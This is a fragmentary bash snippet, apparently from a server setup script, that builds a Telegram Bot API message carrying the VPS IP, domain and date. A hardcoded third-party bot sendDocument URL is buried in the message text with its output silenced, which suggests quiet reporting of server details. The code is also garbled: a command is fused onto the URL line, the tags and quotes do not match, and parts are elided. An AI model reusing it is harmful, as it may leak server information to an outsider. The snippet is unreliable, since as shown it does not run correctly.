...
read -rp "Enter Chat id, Channel, Group Or Your Id  : " -e id
TIMES="10"
CHATID=$id
KEY=$token
URL="https://api.telegram.org/bot$KEY/sendMessage"sleep 1
clear
...
TEXT="
<code>$IP<code>
<code>Your Domain : $domain<code>
<code>Date       : $date<code>
<code>Your IP VPS  : $IP" http://telegram.me/@yokkoeddy_bot/sendDocument &> /dev/null<code>
"
...
#read -rp "Enter Token (Contact YakkoRasZ14) : " -e token
